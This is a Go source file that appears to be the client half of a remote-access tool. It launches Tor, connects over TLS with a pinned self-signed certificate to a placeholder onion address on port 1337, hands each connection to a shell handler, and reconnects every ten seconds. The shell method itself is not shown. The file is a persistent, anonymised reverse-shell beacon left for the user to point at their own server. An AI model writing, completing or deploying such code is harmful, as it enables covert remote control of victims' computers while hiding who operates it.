package client

import (
	"crypto/tls"
	"crypto/x509"
	"log"
	"net"
	"time"

	"github.com/cretz/bine/tor"
)

const (
	// serverDomain needs to be changed to your address
	serverDomain = "onionadresshere.onion"
	serverPort   = ":1337"
	serverAddr   = serverDomain + serverPort
)

// serverCert tls certificate of the server
const serverCert = `-----BEGIN CERTIFICATE-----
MIIBdzCCAR2gAwIBAgIQCJzxHQ+xnScMYFahlDW5fjAKBggqhkjOPQQDAjASMRAw
DgYDVQQKEwdBY21lIENvMB4XDTE5MDExODAwMDIzMVoXDTIwMDExODAwMDIzMVow
EjEQMA4GA1UEChMHQWNtZSBDbzBZMBMGByqGSM49AgEGCCqGSM49AwEHA0IABHBV
FZmVFjCiYKpSDtFwESwezOD3hCgBDCsvXYWBEsASGJOVUADh9YS+C4vUj5R8n5RT
BoS6VS2GINajDSio/VOjVTBTMA4GA1UdDwEB/wQEAwICpDATBgNVHSUEDDAKBggr
BgEFBQcDATAPBgNVHRMBAf8EBTADAQH/MBsGA1UdEQQUMBKCEHBzZXVkb2hvc3Qu
b25pb24wCgYIKoZIzj0EAwIDSAAwRQIgJ6Jec8exBiYMeK3LwF2su5OD+6gUJ92b
h+YOLiNCoB4CIQC+vx3B4RIADu7CTWYH5E1WeRES/zdocTdBgchWozpypw==
-----END CERTIFICATE-----`

type connection struct {
	Conn    net.Conn
	Sysinfo string
}

func connect(dialer *tor.Dialer) (net.Conn, error) {
	conn, err := dialer.Dial("tcp", serverAddr)
	if err != nil {
		return nil, err
	}
	log.Println("connect")
	caPool := x509.NewCertPool()
	caPool.AppendCertsFromPEM([]byte(serverCert))

	config := tls.Config{RootCAs: caPool, ServerName: serverDomain}
	tlsconn := tls.Client(conn, &config)
	if err != nil {
		return nil, err
	}
	return tlsconn, nil
}

func NetClient() {
	log.Println("NetClient")
	conf := tor.StartConf{ExePath: TorExe, ControlPort: 9051, DataDir: TorData, NoAutoSocksPort: true}
	t, err := tor.Start(nil, &conf)
	if err != nil {
		log.Println("[!] Tor could not be started:", err)
		return
	}
	defer t.Close()
	dialer, err := t.Dialer(nil, nil)
	for {
		conn, err := connect(dialer)
		if err != nil {
			time.Sleep(10 * time.Second)
			continue
		}
		c := new(connection)
		c.Conn = conn
		c.shell()
		time.Sleep(10 * time.Second)
	}
}
